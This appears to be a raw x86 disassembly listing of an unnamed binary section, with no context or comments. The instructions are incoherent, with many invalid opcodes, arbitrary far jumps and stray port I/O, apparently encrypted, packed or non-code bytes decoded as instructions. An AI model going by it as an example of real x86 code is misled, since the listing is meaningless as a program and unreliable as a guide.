  418adb:	icebp  
  418adc:	and    BYTE PTR [ebx-0x25],cl
  418adf:	sub    eax,esi
  418ae1:	rcr    DWORD PTR [ebp+0x160f145c],1
  418ae7:	jl     0x418a76
  418ae9:	and    esi,DWORD PTR [edi+0x67b9ea5c]
  418aef:	add    al,0x7f
  418af1:	addr16 jbe 0x418afe
  418af4:	ss daa 
  418af6:	adc    al,BYTE PTR [edx+0x49646bef]
  418afc:	scas   eax,DWORD PTR es:[edi]
  418afd:	bound  edi,QWORD PTR [ebp+eiz*8+0x41208b4f]
  418b04:	mov    ebp,0x890ec70a
  418b09:	loop   0x418ad0
  418b0b:	ds sub eax,0x6f155782
  418b11:	pop    esi
  418b12:	test   BYTE PTR [ebx-0x44],cl
  418b15:	jo     0x418add
  418b17:	sub    ah,BYTE PTR [esi]
  418b19:	scas   al,BYTE PTR es:[edi]
  418b1a:	popf   
  418b1b:	add    cl,BYTE PTR [ecx]
  418b1d:	inc    ecx
  418b1e:	push   edi
  418b1f:	or     eax,0xc4380cc2
  418b24:	pop    ecx
  418b25:	sbb    dh,BYTE PTR [ecx]
  418b27:	aaa    
  418b28:	mov    ds:0x4195bef2,al
  418b2d:	daa    
  418b2e:	es addr16 mov eax,0xb681f11d
  418b35:	mov    eax,ds:0x2649935c
  418b3a:	clc    
  418b3b:	aaa    
  418b3c:	inc    ecx
  418b3d:	xor    BYTE PTR [eax+0x18],dl
  418b40:	mov    dl,0xbd
  418b42:	cmp    DWORD PTR [ecx-0x665cfc88],ebx
  418b48:	outs   dx,DWORD PTR ds:[esi]
  418b49:	mov    WORD PTR [edi+0x10477f4d],cs
  418b4f:	imul   edi,DWORD PTR [eax+0x4e],0xf633073e
  418b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b57:	leave  
  418b58:	inc    esi
  418b59:	std    
  418b5a:	push   es
  418b5b:	sahf   
  418b5c:	jne    0x418b8f
  418b5e:	ins    DWORD PTR es:[edi],dx
  418b5f:	ja     0x418b80
  418b61:	in     eax,0xd5
  418b63:	inc    esi
  418b64:	aam    0x80
  418b66:	iret   
  418b67:	and    eax,0x2269cc03
  418b6c:	mov    esp,0xa3f950fc
  418b71:	add    esi,DWORD PTR [ebx+0x3c85cb22]
  418b77:	pop    ss
  418b78:	add    BYTE PTR [edx+edx*8+0x3d],0x7
  418b7d:	mov    ds:0xdeb3fbe,al
  418b82:	in     eax,0x18
  418b84:	sub    BYTE PTR ds:0x32337610,bh
  418b8b:	push   edx
  418b8c:	adc    ecx,DWORD PTR [eax]
  418b8e:	xchg   edx,eax
  418b8f:	call   0x77f0:0x57125bd
  418b96:	repz jmp 0x418b69
  418b99:	xchg   edx,eax
  418b9a:	int3   
  418b9b:	xor    DWORD PTR [esi-0x40daac13],esp
  418ba1:	mov    ss,eax
  418ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba4:	mov    ds:0x62764cf7,al
  418ba9:	inc    esp
  418baa:	test   al,0x79
  418bac:	add    ebx,esi
  418bae:	mov    ah,0x14
  418bb0:	mov    cl,0xd3
  418bb2:	aam    0xbb
  418bb4:	pop    edi
  418bb5:	int3   
  418bb6:	cld    
  418bb7:	inc    ecx
  418bb8:	adc    DWORD PTR [ebx],0x57
  418bbb:	dec    ecx
  418bbc:	sub    eax,0x420c49df
  418bc1:	or     al,0xd7
  418bc3:	ret    
  418bc4:	sub    eax,0x329c3e90
  418bc9:	inc    ebx
  418bca:	xor    edx,DWORD PTR [eax+0x35]
  418bcd:	hlt    
  418bce:	sbb    BYTE PTR [edi],0xf1
  418bd1:	pop    ecx
  418bd2:	add    al,dl
  418bd4:	cmp    eax,0x4b9965f5
  418bd9:	in     al,0xdd
  418bdb:	cmp    eax,0xe8473725
  418be0:	pusha  
  418be1:	sti    
  418be2:	pop    esp
  418be3:	jne    0x418ba1
  418be5:	jle    0x418be3
  418be7:	jne    0x418c36
  418be9:	lahf   
  418bea:	xchg   ebx,eax
  418beb:	popf   
  418bec:	ja     0x418c26
  418bee:	ret    
  418bef:	cdq    
  418bf0:	loopne 0x418bcc
  418bf2:	call   0x64aa:0x451c87e2
  418bf9:	dec    eax
  418bfa:	mov    ch,0x6b
  418bfc:	sbb    edi,edx
  418bfe:	add    DWORD PTR [eax-0x461a9b59],ebp
  418c04:	cli    
  418c05:	out    0x93,eax
  418c07:	shl    BYTE PTR [esi+edx*4-0x434b5f05],cl
  418c0e:	iret   
  418c0f:	mov    eax,ss
  418c11:	shr    DWORD PTR [edx+0x39],0x35
  418c15:	jmp    FWORD PTR [eax-0x469d94cd]
  418c1b:	cdq    
  418c1c:	xor    ch,BYTE PTR [edx-0x3888b930]
  418c22:	fist   DWORD PTR [ebx-0x252f1eb8]
  418c28:	in     eax,dx
  418c29:	shr    BYTE PTR [ebx+0x1d3698e],0xfc
  418c30:	arpl   WORD PTR [esi],sp
  418c32:	call   0xe031f7a6
  418c37:	in     al,dx
  418c38:	dec    ecx
  418c39:	(bad)  
  418c3a:	sbb    ebx,DWORD PTR [edi]
  418c3c:	inc    eax
  418c3d:	cmp    esp,esp
  418c3f:	dec    ebx
  418c40:	pop    eax
  418c41:	xchg   ebp,edx
  418c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c44:	jecxz  0x418c3e
  418c46:	pushf  
  418c47:	dec    edi
  418c48:	push   0xffffff82
  418c4a:	adc    eax,0xa8712c9b
  418c4f:	sub    edi,DWORD PTR [edx+ebp*2]
  418c52:	pop    eax
  418c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c54:	fs fs aad 0x5b
  418c58:	pop    esi
  418c59:	xchg   esi,eax
  418c5a:	mov    cl,ch
  418c5c:	jae    0x418ca9
  418c5e:	int    0x6a
  418c60:	add    ecx,0xa38b383f
  418c66:	pop    ds
  418c67:	test   al,0x2a
  418c69:	cwde   
  418c6a:	out    0x3f,al
  418c6c:	in     al,dx
  418c6d:	arpl   WORD PTR [eax+0x7],sp
  418c70:	int3   
  418c71:	out    0x66,eax
  418c73:	dec    ebp
  418c74:	fsub   QWORD PTR [edx+0x23]
  418c77:	sahf   
  418c78:	or     eax,0x57692907
  418c7d:	int    0xa1
  418c7f:	loop   0x418c44
  418c81:	adc    al,0xce
  418c83:	inc    esi
  418c84:	test   al,0xf6
  418c86:	das    
  418c87:	inc    ebp
  418c88:	xlat   BYTE PTR ds:[ebx]
  418c89:	stos   BYTE PTR es:[edi],al
  418c8a:	push   eax
  418c8b:	inc    esp
  418c8c:	shl    DWORD PTR [ecx-0x2eb3a649],1
  418c92:	mov    eax,edi
  418c94:	pop    ebx
  418c95:	mov    ch,0x44
  418c97:	mov    al,0x0
	...
  418d11:	add    BYTE PTR [eax],al
  418d13:	add    bl,ah
  418d15:	pop    ds
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	adc    al,0xfe
  418d19:	mov    ebp,0x9faffff3
  418d1e:	test   ah,0xe9
  418d21:	ret    
  418d22:	pop    esp
  418d23:	out    0x91,eax
  418d25:	add    DWORD PTR cs:[eax],eax
  418d28:	ins    BYTE PTR es:[edi],dx
  418d29:	pop    es
  418d2a:	add    BYTE PTR [eax],al
  418d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d2d:	std    
  418d2e:	mov    BYTE PTR [ebp*4+0x4053c8ac],ah
  418d35:	sub    BYTE PTR [ebp+0x26],ah
  418d38:	jns    0x418d10
  418d3a:	test   eax,0xcad3ba11
  418d3f:	inc    esp
  418d40:	cmp    edx,edx
  418d42:	mov    esi,0x3b54558b
  418d47:	mov    ah,0x5d
  418d49:	das    
  418d4a:	sbb    al,0x8
  418d4c:	push   ds
  418d4d:	mov    ebx,0xb487cdc6
  418d52:	mov    bh,0xf
  418d54:	and    al,0x8
  418d56:	jp     0x418d14
  418d58:	test   al,0x4c
  418d5a:	pop    esi
  418d5b:	ja     0x418dc6
  418d5d:	sbb    eax,0xffa953cb
  418d62:	ficomp DWORD PTR ss:[ebx]
  418d65:	dec    ebx
  418d66:	mov    DWORD PTR [ebp-0x46],eax
  418d69:	mov    dh,0xcb
  418d6b:	mov    ah,0x48
  418d6d:	xchg   edi,eax
  418d6e:	(bad)  
  418d6f:	and    bl,BYTE PTR [ecx-0x55]
  418d72:	cld    
  418d73:	sahf   
  418d74:	sar    ebx,1
  418d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d77:	clc    
  418d78:	inc    edi
  418d79:	or     eax,0xb59da733
  418d7e:	lods   eax,DWORD PTR ds:[esi]
  418d7f:	xchg   esi,eax
  418d80:	icebp  
  418d81:	pop    edx
  418d82:	xchg   DWORD PTR [eax-0x6e32e857],edi
  418d88:	hlt    
  418d89:	mov    ebx,0xd190d54e
  418d8e:	xor    eax,0xbdf3824a
  418d93:	mov    bl,0x70
  418d95:	hlt    
  418d96:	mov    ecx,0xe8a5a1a8
  418d9b:	xor    ebp,ecx
  418d9d:	jmp    0x9438:0x56d9c9cd
  418da4:	pop    es
  418da5:	sub    al,0xc0
  418da7:	das    
  418da8:	retf   0x8aee
  418dab:	(bad)  
  418dac:	adc    edi,DWORD PTR [ecx-0x6f]
  418daf:	cmp    BYTE PTR [ebx-0x1e8370f9],cl
  418db5:	sbb    DWORD PTR [ecx-0x56a3fde5],ecx
  418dbb:	mov    al,0x57
  418dbd:	imul   esp,DWORD PTR [esi+0x7e1f49b5],0x14866c2f
  418dc7:	popa   
  418dc8:	stc    
  418dc9:	push   esp
  418dca:	mov    edi,0xf40b6765
  418dcf:	out    0x8a,al
  418dd1:	pop    esp
  418dd2:	repz out 0x4a,eax
  418dd5:	test   al,0x4c
  418dd7:	ins    BYTE PTR es:[edi],dx
  418dd8:	mov    WORD PTR [edx-0x2f9ca07],es
  418dde:	imul   esi,DWORD PTR [ebx+edi*1-0x40],0x9592670f
  418de6:	sub    eax,0x95ca2379
  418deb:	(bad)  
  418dec:	mov    edi,0x1d39c7a6
  418df1:	sar    DWORD PTR cs:[ebx+0x73f5102e],cl
  418df8:	mov    dl,0xc8
  418dfa:	cwde   
  418dfb:	daa    
  418dfc:	lock dec ebp
  418dfe:	and    eax,DWORD PTR [ebx-0x15064019]
  418e04:	stc    
  418e05:	dec    ecx
  418e06:	imul   ebp,DWORD PTR [edi+0xf081f],0xf379f90
  418e10:	not    DWORD PTR [edx]
  418e12:	push   es
  418e13:	xchg   DWORD PTR [eax+0x3fac5cb5],edi
  418e19:	shl    BYTE PTR [ebp-0x37903082],cl
  418e1f:	pusha  
  418e20:	mov    al,0xd0
  418e22:	into   
  418e23:	loopne 0x418e11
  418e25:	mov    ch,0xbe
  418e27:	xor    BYTE PTR [ebx],dh
  418e29:	scas   eax,DWORD PTR es:[edi]
  418e2a:	in     eax,dx
  418e2b:	inc    ebp
  418e2c:	xchg   edi,eax
  418e2d:	inc    ebp
  418e2e:	shl    DWORD PTR [edx-0x1a],0x58
  418e32:	push   ebp
  418e33:	cwde   
  418e34:	ror    ch,cl
  418e36:	js     0x418e59
  418e38:	(bad)  
  418e39:	std    
  418e3a:	inc    eax
  418e3b:	jne    0x418ddb
  418e3d:	and    esi,DWORD PTR [eax]
  418e3f:	fsubr  DWORD PTR [ecx-0x23]
  418e42:	jmp    0xc04e9772
  418e47:	mov    al,0x12
  418e49:	fcmovnu st,st(5)
  418e4b:	je     0x418dfe
  418e4d:	ja     0x418e1e
  418e4f:	add    al,al
  418e51:	xchg   esi,eax
  418e52:	repz jmp 0xf513:0x41dc7270
  418e5a:	adc    eax,0xdf9ea86d
  418e5f:	jo     0x418e03
  418e61:	and    bl,dl
  418e63:	repz pop esi
  418e65:	adc    DWORD PTR [edi+0x252af9f5],edx
  418e6b:	mov    dl,0x61
  418e6d:	nop
  418e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e6f:	addr16 pop esi
  418e71:	and    al,al
  418e73:	adc    DWORD PTR [esp+edx*2-0x44b2c9f4],ebp
  418e7a:	mov    ebp,0xee83b81f
  418e7f:	xor    al,0x32
  418e81:	out    0xa5,eax
  418e83:	test   al,0x59
  418e85:	inc    ebx
  418e86:	sub    dh,ah
  418e88:	(bad)  
  418e89:	jmp    0x1f35af8c
  418e8e:	adc    esi,ebx
  418e90:	mov    BYTE PTR [edi-0x2eaf8384],cl
  418e96:	dec    ebx
  418e97:	sahf   
  418e98:	sbb    al,0x6c
  418e9a:	push   ecx
  418e9b:	in     al,dx
  418e9c:	adc    dh,bh
  418e9e:	shl    BYTE PTR [esi-0x2a8913b4],0x6d
  418ea5:	dec    ebp
  418ea6:	inc    edx
  418ea7:	jne    0x418e9f
  418ea9:	adc    al,0xf2
  418eab:	lahf   
  418eac:	mov    edx,0x3fbacb4f
  418eb1:	mov    ds:0xdace784e,al
  418eb6:	aaa    
  418eb7:	sbb    dh,dl
  418eb9:	loopne 0x418f30
  418ebb:	popa   
  418ebc:	and    DWORD PTR [ebp-0x78],ebx
  418ebf:	pop    eax
  418ec0:	xchg   ebp,eax
  418ec1:	in     al,dx
  418ec2:	into   
  418ec3:	mov    ecx,DWORD PTR [ebp+0x20]
  418ec6:	(bad)  
  418ec7:	mov    cl,0xe3
  418ec9:	sbb    ah,cl
  418ecb:	inc    esp
  418ecc:	jb     0x418e60
  418ece:	mov    dh,0x72
  418ed0:	cmp    cl,BYTE PTR [eax-0x4e]
  418ed3:	ds dec ebp
  418ed5:	dec    esp
  418ed6:	ret    0x685d
  418ed9:	(bad)  
  418eda:	dec    ebx
  418edb:	cdq    
  418edc:	data16 cld 
  418ede:	and    al,0x73
  418ee0:	lea    ebp,[ecx]
  418ee2:	push   esp
  418ee3:	push   ss
  418ee4:	inc    ebp
  418ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee6:	sahf   
  418ee7:	inc    ebp
  418ee8:	fidiv  DWORD PTR [edi+0x46]
  418eeb:	mov    ebp,0x46702c1b
  418ef0:	icebp  
  418ef1:	cmp    ch,ch
  418ef3:	loopne 0x418f4f
  418ef5:	and    al,0x69
  418ef7:	push   ecx
  418ef8:	movlps xmm5,QWORD PTR [ecx-0x7b]
  418efc:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418efe:	out    dx,eax
  418eff:	jae    0x418f54
  418f01:	mov    eax,ds:0x3bbf19c9
  418f06:	mov    ebp,gs
  418f08:	(bad)
  418f0b:	hlt    
  418f0c:	xor    DWORD PTR [eax+0x25],ecx
  418f0f:	mov    eax,0x3ec26b0c
  418f14:	dec    edi
  418f15:	push   0xffffff8e
  418f17:	jnp    0x418eff
  418f19:	inc    esp
  418f1a:	mov    eax,ds:0x264ae47a
  418f1f:	mov    bh,BYTE PTR [edi-0x128688fe]
  418f25:	rol    DWORD PTR [edx-0x6102ddea],1
  418f2b:	shl    BYTE PTR [eax-0x4f],0xb0
  418f2f:	lds    ecx,FWORD PTR [ebx+0x7971f71]
  418f35:	adc    BYTE PTR [ecx-0x3d],bl
  418f38:	mov    edx,0x4826f69b
  418f3d:	push   0xe
  418f3f:	push   cs
  418f40:	imul   esi,DWORD PTR ds:0x8a331596,0x6a829b5e
  418f4a:	pushf  
  418f4b:	test   al,0xed
  418f4d:	in     eax,0xb7
  418f4f:	inc    eax
  418f50:	(bad)
  418f53:	pop    ds
  418f54:	jnp    0x418f2e
  418f56:	pop    edx
  418f57:	inc    esp
  418f58:	jg     0x418fb6
  418f5a:	adc    ebx,eax
  418f5c:	sub    al,0x4b
  418f5e:	gs int3 
  418f60:	stc    
  418f61:	mov    eax,0x4e8e8c12
  418f66:	pop    eax
  418f67:	cmp    al,0xa9
  418f69:	enter  0xc7e3,0xff
  418f6d:	shr    BYTE PTR [eax-0x10],cl
  418f70:	leave  
  418f71:	mov    edx,0x717ef125
  418f76:	cdq    
  418f77:	sbb    ah,BYTE PTR ds:0xf0320981
  418f7d:	imul   ecx,DWORD PTR [edi+0x78],0xfffffffb
  418f81:	mov    al,ds:0x890911c
  418f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f87:	xchg   BYTE PTR [edi+0x2e40201e],dh
  418f8d:	sub    eax,0x3986495e
  418f92:	ja     0x418fd6
  418f94:	add    ecx,0xec7f5da4
  418f9a:	xchg   edx,eax
  418f9b:	xchg   ebx,eax
  418f9c:	xor    DWORD PTR [edi-0x3ecb990e],eax
  418fa2:	cmp    al,0x8f
  418fa4:	fidivr DWORD PTR [esp+ecx*4]
  418fa7:	test   edx,ebp
  418fa9:	inc    esp
  418faa:	or     BYTE PTR [edx+ebx*8+0x79],bh
  418fae:	sub    DWORD PTR [ecx],eax
  418fb0:	stos   DWORD PTR es:[edi],eax
  418fb1:	jnp    0x418f65
  418fb3:	mov    ax,ds:0x99030fab
  418fb9:	pop    ds
  418fba:	jno    0x418fc8
  418fbc:	in     al,dx
  418fbd:	push   0xffffffe2
  418fbf:	lods   al,BYTE PTR ds:[esi]
  418fc0:	call   0xc1a5545e
  418fc5:	stc    
  418fc6:	sub    eax,DWORD PTR [ebx-0x499c2171]
  418fcc:	xor    DWORD PTR [eax],esi
  418fce:	mov    bh,dl
  418fd0:	cs popf 
  418fd2:	cmp    al,0x1c
  418fd4:	fadd   QWORD PTR [eax]
  418fd6:	cmp    BYTE PTR [ebx-0x424959b9],cl
  418fdc:	lahf   
  418fdd:	mov    cl,BYTE PTR [edx]
  418fdf:	xchg   ebp,eax
  418fe0:	add    dl,BYTE PTR cs:[eax+ebp*2-0x583f1d41]
  418fe8:	push   esp
  418fe9:	and    eax,0xd9e1a6e
  418fee:	cwde   
  418fef:	cmp    cl,BYTE PTR [ecx]
  418ff1:	xor    eax,0xa85328c7
  418ff6:	jmp    0x42350ebf
  418ffb:	lods   eax,DWORD PTR ds:[esi]
  418ffc:	jns    0x419077
  418ffe:	cdq    
  418fff:	pop    ds
  419000:	dec    ecx
  419001:	das    
  419002:	(bad)  
  419003:	jge    0x41902b
  419005:	cs inc edi
  419007:	push   0x87660e8b
  41900c:	add    ch,al
  41900e:	mov    dh,0x29
  419010:	sti    
  419011:	cmc    
  419012:	fist   WORD PTR ds:0x918cc071
  419018:	dec    edi
  419019:	fsubr  DWORD PTR [eax-0x4d]
  41901c:	ret    
  41901d:	sbb    ebp,DWORD PTR [eax]
  41901f:	daa    
  419020:	and    DWORD PTR [ebx+0x9f56981],esi
  419026:	addr16 aas 
  419028:	unpcklps xmm4,XMMWORD PTR [edi]
  41902b:	push   ebp
  41902c:	adc    bl,BYTE PTR [esi]
  41902e:	neg    BYTE PTR [edi-0x2474c0cd]
  419034:	aad    0x5e
  419036:	cmp    DWORD PTR [edx-0x5cd76844],esi
  41903c:	pop    ebx
  41903d:	adc    DWORD PTR [eax],esp
  41903f:	scas   eax,DWORD PTR es:[edi]
  419040:	push   ebx
  419041:	push   cs
  419042:	mov    ebx,0x8e431b5f
  419047:	or     BYTE PTR [ebp+0x1e89a1c4],bh
  41904d:	jecxz  0x418fee
  41904f:	mov    cl,0x6b
  419051:	add    eax,0xd2c4a8cc
  419056:	out    0x3d,al
  419058:	sbb    ch,ah
  41905a:	fwait
  41905b:	or     al,0xa9
  41905d:	vpaddq xmm5,xmm3,XMMWORD PTR [eax+eiz*8]
  419062:	push   es
  419063:	mov    al,0x60
  419065:	ficomp WORD PTR [esi-0x550b0b03]
  41906b:	cdq    
  41906c:	outs   dx,DWORD PTR ds:[esi]
  41906d:	pop    ebx
  41906e:	loop   0x419072
  419070:	add    eax,DWORD PTR [ecx]
  419072:	push   es
  419073:	shr    DWORD PTR [esi-0x5f8fd4a3],0x3e
  41907a:	push   edx
  41907b:	push   cs
  41907c:	scas   al,BYTE PTR es:[edi]
  41907d:	jns    0x419062
  41907f:	xor    bh,BYTE PTR [esi+0x56]
  419082:	xor    cl,BYTE PTR [bx+0x48]
  419086:	cwde   
  419087:	cmp    esi,0xffffffef
  41908a:	or     eax,0x300d8d6e
  41908f:	mov    cl,0xdc
  419091:	jmp    0x4190c8
  419093:	inc    esi
  419094:	and    esi,DWORD PTR [ecx]
  419096:	push   0x51d4cca9
  41909b:	jne    0x419064
  41909d:	jle    0x4190b3
  41909f:	lock pop edx
  4190a1:	xchg   BYTE PTR [ebx],bh
  4190a3:	dec    esp
  4190a4:	cmc    
  4190a5:	(bad)  
  4190a6:	mov    bl,0x26
  4190a8:	push   edx
  4190a9:	mov    bl,0xd
  4190ab:	sub    DWORD PTR [esp+ebp*8-0x509504cd],ebp
  4190b2:	jne    0x4190bc
  4190b4:	ds jl  0x4190c2
  4190b7:	mov    es,WORD PTR [edx+ebx*2+0x5c]
  4190bb:	les    esi,FWORD PTR [ecx]
  4190bd:	mov    dl,0x63
  4190bf:	xor    DWORD PTR [ebp+0x13],ebp
  4190c2:	mov    eax,ds:0x3fa7f66c
  4190c7:	dec    ecx
  4190c8:	jle    0x4190ba
  4190ca:	mov    bl,dh
  4190cc:	(bad)  
  4190cd:	fnstcw WORD PTR [edx-0x29]
  4190d0:	(bad)  
  4190d1:	lock fidiv DWORD PTR [ecx-0xb]
  4190d5:	add    eax,ebp
  4190d7:	mov    eax,ds:0x21eb8c55
  4190dc:	xchg   esi,eax
  4190dd:	mov    edx,0x3f4e47b1
  4190e2:	enter  0xe578,0xa6
  4190e6:	dec    ebp
  4190e7:	pop    ss
  4190e8:	aad    0xe9
  4190ea:	inc    ebp
  4190eb:	xor    eax,0xdb367c19
  4190f0:	fisub  WORD PTR [eax-0x2001b957]
  4190f6:	int3   
  4190f7:	(bad)  
  4190f8:	push   edi
  4190f9:	mov    esp,0xf8f681c7
  4190fe:	sub    edi,edi
  419100:	shr    dl,cl
  419102:	mov    esp,0x3b8e9f19
  419107:	mov    eax,ds:0xc90639f7
  41910c:	jb     0x419138
  41910e:	lds    ebx,FWORD PTR [edx]
  419110:	hlt    
  419111:	dec    esp
  419112:	dec    DWORD PTR [ebp+0x60]
  419115:	pop    eax
  419117:	inc    edi
  419118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419119:	clc    
  41911a:	mov    es,WORD PTR [ecx]
  41911c:	jle    0x419190
  41911e:	xchg   esp,eax
  41911f:	adc    al,0x13
  419121:	xchg   edi,eax
  419122:	pop    edx
  419123:	shr    ecx,0x4a
  419126:	in     eax,0x39
  419128:	jmp    0x4190f9
  41912a:	dec    ebp
  41912b:	xchg   edx,eax
  41912c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41912d:	dec    esi
  41912e:	sahf   
  41912f:	cmp    al,0x45
  419131:	xchg   ebp,eax
  419132:	push   esi
  419133:	ds out dx,al
  419135:	dec    ebp
  419136:	jbe    0x419117
  419138:	ds in  eax,dx
  41913a:	cmp    eax,edx
  41913c:	les    ebx,FWORD PTR [ebx-0xed09c3c]
  419142:	ss jg  0x419115
  419145:	jmp    0xdcc9a049
  41914a:	add    edx,edi
  41914c:	sbb    ebx,0x354d828f
  419152:	add    esp,DWORD PTR ds:0x460806bd
  419158:	mov    ch,0x4e
  41915a:	mov    BYTE PTR [edx-0x1db555ee],cl
  419160:	aad    0x89
  419162:	and    al,0x37
  419164:	dec    esp
  419165:	(bad)  
  419168:	aaa    
  419169:	int3   
  41916a:	(bad)  
  41916b:	imul   BYTE PTR [ebx+0x3e]
  41916e:	jno    0x41914f
  419170:	xor    DWORD PTR [edi+esi*8+0x16180814],ebp
  419177:	cli    
  419178:	(bad)  
  419179:	cmp    BYTE PTR [ebx],cl
  41917b:	retf   0xcca0
  41917e:	mov    ebx,0x92a5c22e
  419183:	cmp    ch,BYTE PTR [ecx-0x71]
  419186:	out    0x5a,eax
  419188:	push   0x5f
  41918a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41918b:	mov    eax,ds:0x995f3b9c
  419190:	lods   al,BYTE PTR ds:[esi]
  419191:	and    BYTE PTR [eax],ah
  419193:	xchg   edi,eax
  419194:	(bad)  
  419195:	mov    bh,0xca
  419197:	cmp    eax,0xd34ee977
  41919c:	xchg   DWORD PTR [eax+0x6d342636],eax
  4191a2:	or     DWORD PTR [ecx],ebx
  4191a4:	iret   
  4191a5:	scas   eax,DWORD PTR es:[edi]
  4191a6:	dec    eax
  4191a7:	test   edx,esp
  4191a9:	popf   
  4191aa:	mov    cl,0x6
  4191ac:	dec    eax
  4191ad:	adc    DWORD PTR [edi],esi
  4191af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191b0:	aad    0xe1
  4191b2:	dec    eax
  4191b3:	dec    ecx
  4191b4:	and    al,0xb9
  4191b6:	es stos DWORD PTR es:[edi],eax
  4191b8:	xor    ch,BYTE PTR [eax+ecx*4+0x10]
  4191bc:	xchg   BYTE PTR ds:0xe34c02d9,ah
  4191c2:	mov    ds:0xd4693ca3,al
  4191c7:	inc    esi
  4191c8:	out    0xf1,eax
  4191ca:	iret   
  4191cb:	jo     0x419209
  4191cd:	xor    bh,bl
  4191cf:	call   0xa015:0xcc2ef283
  4191d6:	pop    ds
  4191d7:	inc    esi
  4191d8:	pusha  
  4191d9:	adc    al,0xa5
  4191db:	icebp  
  4191dc:	popa   
  4191dd:	ss mov eax,0x1998f5c2
  4191e3:	stos   BYTE PTR es:[edi],al
  4191e4:	mov    ch,bh
  4191e6:	dec    edx
  4191e7:	inc    esp
  4191e8:	mov    ch,0xe
  4191ea:	adc    eax,0x6561a4b8
  4191ef:	out    0x4e,eax
  4191f1:	ror    edx,cl
  4191f3:	sub    cl,al
  4191f5:	outs   dx,DWORD PTR ds:[esi]
  4191f6:	ins    DWORD PTR es:[edi],dx
  4191f7:	adc    DWORD PTR [edx-0x6a],ebp
  4191fa:	call   FWORD PTR ds:0x3e179116
  419200:	add    al,0x22
  419202:	mov    edi,0x17caed1e
  419207:	aas    
  419208:	ret    
  419209:	push   eax
  41920a:	fdivrp st(5),st
  41920c:	jmp    0x4191da
  41920e:	in     al,dx
  41920f:	retf   
  419210:	retf   0xb051
  419213:	(bad)  
  419214:	fisubr WORD PTR [edi-0x1d]
  419217:	push   edi
  419218:	cmp    bh,BYTE PTR [ebx+0x13]
  41921b:	sbb    al,0x6c
  41921d:	mov    ch,bh
  41921f:	iret   
  419220:	jno    0x4191f8
  419222:	lock push ebp
  419224:	gs loop 0x4191ae
  419227:	lods   eax,DWORD PTR fs:[esi]
  419229:	pop    ss
  41922a:	js     0x419206
  41922c:	ret    0xd594
  41922f:	xor    al,0x99
  419231:	pop    esp
  419232:	cmovne edi,DWORD PTR [ebx+0x44]
  419236:	(bad)  
  419237:	xor    BYTE PTR [eax-0x3bd1c28c],ch
  41923d:	sub    esp,DWORD PTR [edi]
  41923f:	in     al,dx
  419240:	enter  0xdea7,0x7
  419244:	jg     0x41928f
  419246:	clc    
  419247:	test   eax,0xbced47e5
  41924c:	inc    ecx
  41924d:	imul   edx,eax,0x4a
  419250:	sub    eax,0x62a3cebb
  419255:	sbb    BYTE PTR [ebp-0x36],ch
  419258:	out    dx,al
  419259:	pusha  
  41925a:	(bad)  
  41925b:	jl     0x41926e
  41925d:	out    dx,al
  41925e:	ja     0x419211
  419260:	test   al,0x1c
  419262:	inc    ebp
  419263:	sbb    BYTE PTR [ebp+0x296d03ae],bh
  419269:	stos   BYTE PTR es:[edi],al
  41926a:	sbb    ch,BYTE PTR [eax+0x7f]
  41926d:	clc    
  41926e:	xchg   ebx,eax
  41926f:	jp     0x419214
  419271:	mov    bh,0x17
  419273:	jmp    0xdeb0:0x2beff288
  41927a:	fdivr  QWORD PTR ds:0x2090dd96
  419280:	xor    ecx,0xffffffff
  419283:	jl     0x419207
  419285:	outs   dx,DWORD PTR ds:[esi]
  419286:	xor    eax,0x6869399f
  41928b:	push   eax
  41928c:	sti    
  41928d:	icebp  
  41928e:	xchg   ebp,eax
  41928f:	ss jp  0x4192fe
  419292:	fs inc esp
  419294:	push   0xffffffed
  419296:	jb     0x41929d
  419298:	lahf   
  419299:	push   ds
  41929a:	xchg   esi,eax
  41929b:	jmp    0xc0c7:0xd5447abb
  4192a2:	mov    dl,0x1a
  4192a4:	not    DWORD PTR ds:[esi-0x1f]
  4192a8:	sbb    esi,DWORD PTR [ebx-0x45]
  4192ab:	mov    al,ds:0x88c509c6
  4192b0:	mov    cl,0x58
  4192b2:	dec    edi
  4192b3:	sub    BYTE PTR [ebx-0x5f],cl
  4192b6:	jecxz  0x419266
  4192b8:	fisubr WORD PTR [eax]
  4192ba:	xchg   esi,eax
  4192bb:	cs add eax,0x18
  4192bf:	mov    eax,0xf0dd9e0d
  4192c4:	mov    ch,0xfd
  4192c6:	ficomp DWORD PTR [eax-0x6c]
  4192c9:	(bad)  
  4192ca:	enter  0x4ad5,0x48
  4192ce:	mov    BYTE PTR [ebx+0x6a4d7874],cl
  4192d4:	sub    al,0x4f
  4192d6:	fs xchg ecx,eax
  4192d8:	xchg   DWORD PTR [edx-0x40],ecx
  4192db:	pop    edi
  4192dc:	rcr    BYTE PTR ds:0x52b2c109,0xc0
  4192e3:	popf   
  4192e4:	fcomp  DWORD PTR [edi+0x2c]
  4192e7:	sub    DWORD PTR [ebx+0x4d12d15f],0x20f1a067
  4192f1:	xlat   BYTE PTR ds:[ebx]
  4192f2:	addr16 icebp 
  4192f4:	call   0x868f:0x2f86705c
  4192fb:	dec    esi
  4192fc:	rcpps  xmm5,XMMWORD PTR [edi+0x4821a41e]
  419303:	arpl   WORD PTR [ebp-0x6e],cx
  419306:	sub    cl,BYTE PTR [ebp+0x1a412145]
  41930c:	fistp  QWORD PTR [ebx-0x2cb84eb7]
  419312:	mov    al,0xf1
  419314:	cmp    ebx,esi
  419316:	or     BYTE PTR [edi+0x6f],ah
  419319:	jmp    0x92c0:0x85477617
  419320:	xchg   ecx,eax
  419321:	mov    eax,0x9b0eb514
